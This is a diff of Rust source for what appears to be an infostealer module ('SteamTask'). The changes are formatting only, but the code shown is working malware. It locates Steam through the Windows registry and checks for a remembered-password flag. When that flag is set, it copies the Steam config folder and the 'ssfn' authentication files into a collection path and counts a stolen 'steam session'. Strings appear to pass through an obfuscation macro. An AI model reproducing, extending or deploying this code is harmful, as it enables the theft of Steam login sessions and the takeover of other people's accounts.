@@ -16,11 +16,11 @@ impl<C: Collector, F: FileSystem> Task<C, F> for SteamTask {
 
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let Some(steam_path) = steam_path() else {
-            return
+            return;
         };
 
         if !StorageFileSystem.is_exists(&steam_path) {
-            return
+            return;
         }
 
         let config_path = &steam_path / s!("config");
@@ -30,9 +30,11 @@ impl<C: Collector, F: FileSystem> Task<C, F> for SteamTask {
             config_path,
             steam_path,
             filesystem,
-            parent
-        ).is_none() {
-            return
+            parent,
+        )
+        .is_none()
+        {
+            return;
         }
 
         collector.get_software().increase_steam_session();
@@ -40,8 +42,12 @@ impl<C: Collector, F: FileSystem> Task<C, F> for SteamTask {
 }
 
 fn steam_path() -> Option<Path> {
-    let RegistryValue::String(root) = read_registry_value(HKEY_CURRENT_USER, s!("Software\\Valve\\Steam"), s!("SteamPath"))
-        .ok()?
+    let RegistryValue::String(root) = read_registry_value(
+        HKEY_CURRENT_USER,
+        s!("Software\\Valve\\Steam"),
+        s!("SteamPath"),
+    )
+    .ok()?
     else {
         return None;
     };
@@ -49,14 +55,12 @@ fn steam_path() -> Option<Path> {
     Some(Path::new(root))
 }
 
-fn copy_config_path<
-    SrcFsRef, SrcFs, DstFsRef, DstFs, S, P, D
->(
+fn copy_config_path<SrcFsRef, SrcFs, DstFsRef, DstFs, S, P, D>(
     src_fs: SrcFsRef,
     config_path: S,
     steam_path: P,
     dst_fs: DstFsRef,
-    save_path: D
+    save_path: D,
 ) -> Option<()>
 where
     SrcFsRef: AsRef<SrcFs>,
@@ -78,7 +82,7 @@ where
     let contents = src_fs.read_file(login_file).ok()?;
     let target = "\"RememberPassword\"\t\t\"1\"".as_bytes();
     if !contents.windows(target.len()).any(|chunk| chunk == target) {
-        return None
+        return None;
     }
 
     copy_folder(src_fs, config_path, dst_fs, save_path).ok()?;
@@ -86,7 +90,7 @@ where
     for file in src_fs.list_files_filtered(steam_path, &|file| {
         src_fs.is_file(file) && file.name().unwrap().starts_with("ssfn")
     })? {
-       copy_file(src_fs, file, dst_fs, save_path, true).ok()?;
+        copy_file(src_fs, file, dst_fs, save_path, true).ok()?;
     }
 
     Some(())
